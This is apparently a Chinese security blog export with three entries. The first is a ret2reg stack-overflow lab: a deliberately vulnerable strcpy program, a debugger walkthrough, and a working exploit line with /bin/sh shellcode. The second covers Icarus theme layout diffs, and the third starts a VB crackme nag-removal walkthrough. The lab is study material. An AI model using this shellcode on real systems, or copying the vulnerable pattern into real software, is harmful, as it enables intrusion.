<h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void evilfunction(char *input) &#123;</span><br><span class="line">        char buffer[512];</span><br><span class="line">        strcpy(buffer, input);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">        evilfunction(argv[1]);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>开启地址随机化（ASLR）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>

<p>进行编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector</span><br></pre></td></tr></table></figure>

<p>checksec + IDA分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec ret2reg  </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;ret2reg&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>IDA</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  evilfunction((char *)argv[1]);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">void __cdecl evilfunction(char *input)</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[512]; &#x2F;&#x2F; [esp+0h] [ebp-208h]</span><br><span class="line"></span><br><span class="line">  strcpy(buffer, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，程序将argv[1]对应的字符串拷贝进了buffer中，argv[1]就是程序接收的命令行参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ret2reg 123</span><br></pre></td></tr></table></figure>

<p>123就是我们输入的第一个命令行参数，其中 $argv[0] 就是脚本文件名，argc[1]为输入的第一个参数</p>
<p>查看evilfunction函数的汇编指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0804840B                 push    ebp</span><br><span class="line">.text:0804840C                 mov     ebp, esp</span><br><span class="line">.text:0804840E                 sub     esp, 208h</span><br><span class="line">.text:08048414                 sub     esp, 8</span><br><span class="line">.text:08048417                 push    [ebp+input]     ; src</span><br><span class="line">.text:0804841A                 lea     eax, [ebp+buffer]</span><br><span class="line">.text:08048420                 push    eax             ; dest</span><br><span class="line">.text:08048421                 call    _strcpy</span><br><span class="line">.text:08048426                 add     esp, 10h</span><br><span class="line">.text:08048429                 nop</span><br><span class="line">.text:0804842A                 leave</span><br><span class="line">.text:0804842B                 retn</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看到，lea eax，[ebp+buffer],该指令就是将[ebp + buffer]的偏移地址送给eax，也就相当于eax指向了buffer缓冲区的位置</li>
<li>这时我们就可以向buffer中写入shellcode，并且找到call eax指令地址来覆盖ret，从而拿到shell</li>
<li>这时我们需要查看evilfunction函数返回时，eax是不是还指向缓冲区地址</li>
<li>使用gdb进行调试带参数的程序</li>
</ul>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210106230047556.png" alt="image-20210106230047556"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb --args ret2reg 123</span><br><span class="line">b *0x0804842B</span><br><span class="line">r</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210106230342918.png" alt="image-20210106230342918"></p>
<ul>
<li>可见eax的值仍为缓冲区的地址</li>
<li>接下来查找call eax或者jmp eax指令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ objdump -d ret2reg | grep &quot;*%eax&quot;</span><br><span class="line"> 8048373:	ff d0                	call   *%eax</span><br></pre></td></tr></table></figure>

<ul>
<li>payload就可以构造出来了</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; shellcode + (0x208 + 4 - len(shellcode)) * a + p32(0x8048373)</span><br></pre></td></tr></table></figure>

<p>Exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ret2reg $(perl -e &#39;printf &quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot; . &quot;A&quot;x499 .&quot;\x73\x83\x04\x08&quot;&#39;)</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(oldthree) gid&#x3D;1000(oldthree) groups&#x3D;1000(oldthree),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br></pre></td></tr></table></figure>

<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer overflow</a></p>
<p><a href="http://bobao.360.cn/learning/detail/3694.html">http://bobao.360.cn/learning/detail/3694.html</a></p>
<p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/</a></p>
<p><a href="http://wooyun.jozxing.cc/static/drops/papers-7551.html">http://wooyun.jozxing.cc/static/drops/papers-7551.html</a></p>
<p><a href="http://wooyun.jozxing.cc/static/drops/binary-10638.html">http://wooyun.jozxing.cc/static/drops/binary-10638.html</a></p>
<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Icarus 主题双列显示和目录单独浮动等</title>
    <url>/2020/12/26/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Icarus-%E4%B8%BB%E9%A2%98%E5%8F%8C%E5%88%97%E6%98%BE%E7%A4%BA%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8D%95%E7%8B%AC%E6%B5%AE%E5%8A%A8%E7%AD%89/</url>
    <content><![CDATA[<p>本文是基于icarus 4.x的版本</p>
<p>本博客所选取的主题是 <a href="https://github.com/AlphaLxy/hexo-theme-icarus">Icarus</a> ，并做了一些个性化的修改，很多修改都可以直观的看到。详细的差异可以查看 <a href="https://github.com/ppoffice/hexo-theme-icarus/compare/4.1.1...AlphaLxy:master">diff</a>，这里记录一些主要的改动。</p>
<a id="more"></a>

<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="文章页面两栏布局"><a href="#文章页面两栏布局" class="headerlink" title="文章页面两栏布局"></a>文章页面两栏布局</h3><p>主题默认是三栏布局，在阅读文章时显得有些拥挤。可以通过配置的方式把所有文章变为两栏布局，在<code>_config.post.yml</code>把需要的<code>widget</code>显示在一边即可，可以参考<a href="https://blog.zhangruipeng.me/hexo-theme-icarus/Configuration/icarus用户指南-主题配置/#布局配置文件">官方文档</a>。</p>
<p>但两栏整体宽度跟三栏不同，因此强制指定为三栏布局，并且修改相应的宽度，这样所有的页面侧边栏宽度保持一致。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:layout&#x2F;layout.jsx</span><br><span class="line"></span><br><span class="line">             &lt;Head site&#x3D;&#123;site&#125; config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; page&#x3D;&#123;page&#125; &#x2F;&gt;</span><br><span class="line">-            &lt;body class&#x3D;&#123;&#96;is-$&#123;columnCount&#125;-column&#96;&#125;&gt;</span><br><span class="line">+            &lt;body class&#x3D;&#123;&#96;is-3-column&#96;&#125;&gt;</span><br><span class="line">                 &lt;Navbar config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; page&#x3D;&#123;page&#125; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:layout&#x2F;layout.jsx</span><br><span class="line"></span><br><span class="line">                                 &#39;is-12&#39;: columnCount &#x3D;&#x3D;&#x3D; 1,</span><br><span class="line">-                                &#39;is-8-tablet is-8-desktop is-8-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 2,</span><br><span class="line">+                                &#39;is-8-tablet is-8-desktop is-9-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 2,</span><br><span class="line">                                 &#39;is-8-tablet is-8-desktop is-6-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;widgets.jsx</span><br><span class="line"></span><br><span class="line"> function getColumnSizeClass(columnCount) &#123;</span><br><span class="line">     switch (columnCount) &#123;</span><br><span class="line">         case 2:</span><br><span class="line">-            return &#39;is-4-tablet is-4-desktop is-4-widescreen&#39;;</span><br><span class="line">+            return &#39;is-4-tablet is-4-desktop is-3-widescreen&#39;;</span><br><span class="line">         case 3:</span><br><span class="line">             return &#39;is-4-tablet is-4-desktop is-3-widescreen&#39;;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>并优化在不同屏幕小大下的宽度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;responsive.styl</span><br><span class="line"></span><br><span class="line"> +widescreen()</span><br><span class="line">+    .is-3-column .container</span><br><span class="line">+        max-width: $widescreen - $gap</span><br><span class="line">+        width: $widescreen - $gap</span><br><span class="line">+</span><br><span class="line">     .is-1-column .container, .is-2-column .container</span><br><span class="line">         max-width: $desktop - 2 * $gap</span><br><span class="line">         width: $desktop - 2 * $gap</span><br><span class="line"></span><br><span class="line"> +fullhd()</span><br><span class="line">+    .is-3-column .container</span><br><span class="line">+        max-width: $fullhd - 2 * $gap</span><br><span class="line">+        width: $fullhd - 2 * $gap</span><br><span class="line">+</span><br><span class="line">     .is-2-column .container</span><br><span class="line">         max-width: $widescreen - 2 * $gap</span><br><span class="line">         width: $widescreen - 2 * $gap</span><br></pre></td></tr></table></figure>

<h3 id="优化文章标题布局"><a href="#优化文章标题布局" class="headerlink" title="优化文章标题布局"></a>优化文章标题布局</h3><p>标题移动到文章信息上方，增加更新时间，并增加了icon</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;article.jsx</span><br><span class="line"></span><br><span class="line">                 &#123;&#x2F;* Metadata *&#x2F;&#125;</span><br><span class="line">                 &lt;article class&#x3D;&#123;&#96;card-content article$&#123;&#39;direction&#39; in page ? &#39; &#39; + page.direction : &#39;&#39;&#125;&#96;&#125; role&#x3D;&quot;article&quot;&gt;</span><br><span class="line">+                    &#123;&#x2F;* Title *&#x2F;&#125;</span><br><span class="line">+                    &lt;h1 className&#x3D;&quot;title is-size-3 is-size-4-mobile has-text-weight-normal&quot;&gt;</span><br><span class="line">+                        &#123;index ?</span><br><span class="line">+                            &lt;a className&#x3D;&quot;has-link-black-ter&quot; href&#x3D;&#123;url_for(page.link || page.path)&#125;&gt;</span><br><span class="line">+                                &lt;i className&#x3D;&quot;fas fa-angle-double-right&quot;&gt;&lt;&#x2F;i&gt;&#123;page.title&#125;</span><br><span class="line">+                            &lt;&#x2F;a&gt; :</span><br><span class="line">+                            [&lt;i className&#x3D;&quot;fas fa-angle-double-right&quot;&gt;&lt;&#x2F;i&gt;, page.title]</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &lt;&#x2F;h1&gt;</span><br><span class="line">                     &#123;page.layout !&#x3D;&#x3D; &#39;page&#39; ? &lt;div class&#x3D;&quot;article-meta is-size-7 is-uppercase level is-mobile&quot;&gt;</span><br><span class="line">                         &lt;div class&#x3D;&quot;level-left&quot;&gt;</span><br><span class="line">                             &#123;&#x2F;* Creation Date *&#x2F;&#125;</span><br><span class="line">-                            &#123;page.date &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot; dangerouslySetInnerHTML&#x3D;&#123;&#123;</span><br><span class="line">-                                __html: _p(&#39;article.created_at&#39;, &#96;&lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot;&gt;$&#123;date(page.date)&#125;&lt;&#x2F;time&gt;&#96;)</span><br><span class="line">-                            &#125;&#125;&gt;&lt;&#x2F;span&gt;&#125;</span><br><span class="line">+                            &#123;page.date &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot;&gt;</span><br><span class="line">+                                &lt;i className&#x3D;&quot;far fa-calendar-alt&quot;&gt;&amp;nbsp;&lt;&#x2F;i&gt;</span><br><span class="line">+                                &lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot;&gt;&#123;date(page.date)&#125;&lt;&#x2F;time&gt;</span><br><span class="line">+                            &lt;&#x2F;span&gt;&#125;</span><br><span class="line">                             &#123;&#x2F;* Last Update Date *&#x2F;&#125;</span><br><span class="line">-                            &#123;page.updated &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot; dangerouslySetInnerHTML&#x3D;&#123;&#123;</span><br><span class="line">-                                __html: _p(&#39;article.updated_at&#39;, &#96;&lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot;&gt;$&#123;date(page.updated)&#125;&lt;&#x2F;time&gt;&#96;)</span><br><span class="line">-                            &#125;&#125;&gt;&lt;&#x2F;span&gt;&#125;</span><br><span class="line">+                            &#123;page.updated &amp;&amp; &lt;span class&#x3D;&quot;level-item is-hidden-mobile&quot;&gt;</span><br><span class="line">+                                &lt;i class&#x3D;&quot;far fa-calendar-check&quot;&gt;&amp;nbsp;&lt;&#x2F;i&gt;</span><br><span class="line">+                                &lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot;&gt;&#123;date(page.updated)&#125;&lt;&#x2F;time&gt;</span><br><span class="line">+                            &lt;&#x2F;span&gt;&#125;</span><br><span class="line">                             &#123;&#x2F;* author *&#x2F;&#125;</span><br><span class="line">                             &#123;page.author ? &lt;span class&#x3D;&quot;level-item&quot;&gt; &#123;page.author&#125; &lt;&#x2F;span&gt; : null&#125;</span><br></pre></td></tr></table></figure>

<p>其中时间直接使用日期</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">-    if (typeof moment &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">-        $(&#39;.article-meta time&#39;).each(function() &#123;</span><br><span class="line">-            $(this).text(moment($(this).attr(&#39;datetime&#39;)).fromNow());</span><br><span class="line">-        &#125;);</span><br><span class="line">-    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="优化文章结尾布局"><a href="#优化文章结尾布局" class="headerlink" title="优化文章结尾布局"></a>优化文章结尾布局</h3><p>在文章结尾增加一个 <code>hr</code>，并修改 <code>tags</code> 展示。在预览时（主页）也显示 <code>tags</code>，并且将 <code>Read More</code> 按钮放置在右边。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;article.jsx</span><br><span class="line"></span><br><span class="line">                     &#123;&#x2F;* Licensing block *&#x2F;&#125;</span><br><span class="line">                     &#123;!index &amp;&amp; article &amp;&amp; article.licenses &amp;&amp; Object.keys(article.licenses)</span><br><span class="line">                         ? &lt;ArticleLicensing.Cacheable page&#x3D;&#123;page&#125; config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; &#x2F;&gt; : null&#125;</span><br><span class="line">+                    &lt;hr style&#x3D;&quot;height:1px;margin:1rem 0&quot;&#x2F;&gt;</span><br><span class="line">+                    &lt;div className&#x3D;&quot;level is-mobile is-flex&quot;&gt;</span><br><span class="line">                     &#123;&#x2F;* Tags *&#x2F;&#125;</span><br><span class="line">-                    &#123;!index &amp;&amp; page.tags &amp;&amp; page.tags.length ? &lt;div class&#x3D;&quot;article-tags is-size-7 mb-4&quot;&gt;</span><br><span class="line">-                        &lt;span class&#x3D;&quot;mr-2&quot;&gt;#&lt;&#x2F;span&gt;</span><br><span class="line">-                        &#123;page.tags.map(tag &#x3D;&gt; &#123;</span><br><span class="line">-                            return &lt;a class&#x3D;&quot;link-muted mr-2&quot; rel&#x3D;&quot;tag&quot; href&#x3D;&#123;url_for(tag.path)&#125;&gt;&#123;tag.name&#125;&lt;&#x2F;a&gt;;</span><br><span class="line">+                    &#123;page.tags &amp;&amp; page.tags.length ? &lt;div class&#x3D;&quot;article-tags is-size-7 is-uppercase&quot;&gt;</span><br><span class="line">+                        &lt;i class&#x3D;&quot;fas fa-tags has-text-grey&quot;&gt;&lt;&#x2F;i&gt;&amp;nbsp;</span><br><span class="line">+                        &#123;page.tags.map((tag, index) &#x3D;&gt; &#123;</span><br><span class="line">+                            return &lt;a class&#x3D;&quot;link-muted&quot; rel&#x3D;&quot;tag&quot; href&#x3D;&#123;url_for(tag.path)&#125;&gt;&#123;tag.name&#125;&#123;index !&#x3D;&#x3D; page.tags.length-1? &#39;, &#39;:&#39;&#39;&#125;&lt;&#x2F;a&gt;;</span><br><span class="line">                         &#125;)&#125;</span><br><span class="line">                     &lt;&#x2F;div&gt; : null&#125;</span><br><span class="line">                     &#123;&#x2F;* &quot;Read more&quot; button *&#x2F;&#125;</span><br><span class="line">-                    &#123;index &amp;&amp; page.excerpt ? &lt;a class&#x3D;&quot;article-more button is-small is-size-7&quot; href&#x3D;&#123;&#96;$&#123;url_for(page.link || page.path)&#125;#more&#96;&#125;&gt;&#123;__(&#39;article.more&#39;)&#125;&lt;&#x2F;a&gt; : null&#125;</span><br><span class="line">+                    &#123;index &amp;&amp; page.excerpt ? &lt;a class&#x3D;&quot;article-more button is-small is-size-7&quot; href&#x3D;&#123;&#96;$&#123;url_for(page.link || page.path)&#125;#more&#96;&#125;&gt;&lt;i class&#x3D;&quot;fas fa-book-reader has-text-grey&quot;&gt;&lt;&#x2F;i&gt;&amp;nbsp;&amp;nbsp;&#123;__(&#39;article.more&#39;)&#125;&lt;&#x2F;a&gt; : null&#125;</span><br><span class="line">+                    &lt;&#x2F;div&gt;</span><br><span class="line">                     &#123;&#x2F;* Share button *&#x2F;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="优化个人信息布局"><a href="#优化个人信息布局" class="headerlink" title="优化个人信息布局"></a>优化个人信息布局</h3><p>减少头像大小，头像下方计数的地方增加链接，follow前增加icon。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:layout&#x2F;widget&#x2F;profile.jsx</span><br><span class="line"></span><br><span class="line">-                    &lt;div class&#x3D;&quot;level-item has-text-centered is-marginless&quot;&gt;</span><br><span class="line">+                    &lt;a class&#x3D;&quot;level-item has-text-centered is-marginless&quot; href&#x3D;&#123;counter.category.url&#125;&gt;</span><br><span class="line">                         &lt;div&gt;</span><br><span class="line">                             &lt;p class&#x3D;&quot;heading&quot;&gt;&#123;counter.category.title&#125;&lt;&#x2F;p&gt;</span><br><span class="line">-                            &lt;a href&#x3D;&#123;counter.category.url&#125;&gt;</span><br><span class="line">+                            &lt;div&gt;</span><br><span class="line">                                 &lt;p class&#x3D;&quot;title&quot;&gt;&#123;counter.category.count&#125;&lt;&#x2F;p&gt;</span><br><span class="line">-                            &lt;&#x2F;a&gt;</span><br><span class="line">+                            &lt;&#x2F;div&gt;</span><br><span class="line">                         &lt;&#x2F;div&gt;</span><br><span class="line">-                    &lt;&#x2F;div&gt;</span><br><span class="line">+                    &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="优化移动端显示"><a href="#优化移动端显示" class="headerlink" title="优化移动端显示"></a>优化移动端显示</h3><p>在移动端，隐藏 <code>archive</code> 和 <code>tags</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+    $(&#39;div.container div.card[data-type&#x3D;tags]&#39;).addClass(&#39;is-hidden-mobile&#39;);</span><br><span class="line">+    $(&#39;div.container div.card[data-type&#x3D;archives]&#39;).addClass(&#39;is-hidden-mobile&#39;);</span><br><span class="line"> &#125;(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings));</span><br></pre></td></tr></table></figure>

<h3 id="目录粘性定位"><a href="#目录粘性定位" class="headerlink" title="目录粘性定位"></a>目录粘性定位</h3><p>原来只支持侧边栏整体粘性定位，为了阅读体验，只针对目录开启粘性定位，增加 <code>column-left is-sticky</code> 类，并调整样式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">     if ($toc.length &gt; 0) &#123;</span><br><span class="line">+        $toc.addClass(&#39;column-left is-sticky&#39;);</span><br><span class="line">         const $mask &#x3D; $(&#39;&lt;div&gt;&#39;);</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;article.styl</span><br><span class="line">+#toc</span><br><span class="line">+    max-height: calc(100vh - 22px)</span><br><span class="line">+    overflow-y: scroll</span><br></pre></td></tr></table></figure>



<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="增加许可协议"><a href="#增加许可协议" class="headerlink" title="增加许可协议"></a>增加许可协议</h3><p>新版已经支持许可协议，直接配置即可，参考<a href="https://blog.zhangruipeng.me/hexo-theme-icarus/Configuration/icarus用户指南-主题配置/#文章许可协议">官方文档</a>。</p>
<h3 id="增加标题自动计数"><a href="#增加标题自动计数" class="headerlink" title="增加标题自动计数"></a>增加标题自动计数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;article.styl</span><br><span class="line"></span><br><span class="line">+.article &#123;counter-reset:section&#125;</span><br><span class="line">+.article h2&#123;counter-reset:sub-section&#125;</span><br><span class="line">+.article h3&#123;counter-reset:composite&#125;</span><br><span class="line">+.article h4&#123;counter-reset:detail&#125;</span><br><span class="line">+.article h2:before&#123;content:counter(section) &quot; &quot;;counter-increment:section&#125;</span><br><span class="line">+.article h3:before&#123;content:counter(section) &quot;.&quot; counter(sub-section) &quot; &quot;;counter-increment:sub-section&#125;</span><br><span class="line">+.article h4:before&#123;content:counter(section) &quot;.&quot; counter(sub-section) &quot;.&quot; counter(composite) &quot; &quot;;counter-increment:composite&#125;</span><br></pre></td></tr></table></figure>

<h3 id="默认显示目录"><a href="#默认显示目录" class="headerlink" title="默认显示目录"></a>默认显示目录</h3><p>新版支持直接配置，在<code>_config.yml</code>增加<code>toc: true</code>即可。</p>
<h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="card-增加浮动效果"><a href="#card-增加浮动效果" class="headerlink" title="card 增加浮动效果"></a>card 增加浮动效果</h3><p><code>:hover</code> 时增大阴影，并增加动画属性 <code>ease-in-out</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;card.styl</span><br><span class="line"></span><br><span class="line"> .card</span><br><span class="line">     overflow: visible</span><br><span class="line">     border-radius: $card-radius</span><br><span class="line">+    &amp;:hover</span><br><span class="line">+        box-shadow: 0 6px 15px rgba(0,0,0,0.15), 0 0 1px rgba(0,0,0,0.1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;animation.js</span><br><span class="line"></span><br><span class="line">     setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">         $(&#39;body &gt; .navbar, body &gt; .section, body &gt; .footer&#39;).forEach(element &#x3D;&gt; &#123;</span><br><span class="line">             element.style.opacity &#x3D; &#39;1&#39;;</span><br><span class="line">-            element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out&#39;;</span><br><span class="line">+            element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out&#39;;</span><br><span class="line">         &#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;animation.js</span><br><span class="line"></span><br><span class="line">                     element.style.transform &#x3D; &#39;&#39;;</span><br><span class="line">-                    element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out&#39;;</span><br><span class="line">+                    element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out&#39;;</span><br><span class="line">                 &#125;, i * 100);</span><br></pre></td></tr></table></figure>



<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><code>2020-12-04</code> 基于 <a href="https://github.com/ppoffice/hexo-theme-icarus/releases/tag/4.1.1">4.1.1</a> 版本重新改动。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只列举了部分改动，详细的差异可以查看 <a href="https://github.com/ppoffice/hexo-theme-icarus/compare/4.1.1...AlphaLxy:master">diff</a>。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.alphalxy.com/2019/03/customize-icarus/">https://www.alphalxy.com/2019/03/customize-icarus/</a></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>icarus</tag>
      </tags>
  </entry>
  <entry>
    <title>crackme-系列之-crackme3</title>
    <url>/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/</url>
    <content><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160158599.png" alt="image-20201228160158599" style="zoom:50%;">

<p>发现存在一个neg窗口</p>
<a id="more"></a>

<h2 id="去除neg窗口"><a href="#去除neg窗口" class="headerlink" title="去除neg窗口"></a>去除neg窗口</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>使用VBExploere把timer改为1 破解neg</p>
<p>根据提示框下断点进行分析</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>首先将内存定位到程序开始处0x401000</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160748180.png" alt="image-20201228160748180"></p>
<p>搜索Timer，Timer是VB程序默认的定时器变量</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160816008.png" alt="image-20201228160816008"></p>
<p>我们找到Timer之后 在上面的位置可以看到一个0x1B58，这个是计时器的秒数。也就是十进制的7000,7000毫秒就 是7秒。所以第一种去Neg的方法就是将0x1B58改为0x0001 但是此种方法也有一定的局限性，如果程序的作者将计时器的默认名称改掉之后 根本无法在内存中搜索到Timer关键 字 也就无法下手。下面介绍一种通用的解决方法</p>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>Virtual Basic可执行程序结构研究 对于Visual Basic5/6编译生成的程序，不管自然编译还是伪编译，其程序入口点处的结构都是一样的。来到OEP处：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161030007.png" alt="image-20201228161030007"></p>
<p>指针0x4067D4指向的结构就是Virtual Basic程序的VBHeader结构，由此伸展开，整个VB程序的框架<strong>就在这了。 Virtual Basic程序框架结构</strong></p>
<p> 可能的Virtual Basic程序框架结构如图</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161100147.png" alt="image-20201228161100147"></p>
<p>TVBHeader结构定义</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161129407.png" alt="image-20201228161129407"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161203921.png" alt="image-20201228161203921"></p>
<p>AGUTTable(4C的位置)结构定义</p>
<p>以AfkayAs.2.exe为例说明：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161225305.png" alt="image-20201228161225305"></p>
<p>其对应每个字节的含义如下表</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161314880.png" alt="image-20201228161314880"></p>
<h2 id="4C法实战"><a href="#4C法实战" class="headerlink" title="4C法实战"></a>4C法实战</h2><p>在程序载入到入口点之后的第一个push也就是VBHeader的位置，数据窗口跟随。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161416594.png" alt="image-20201228161416594"></p>
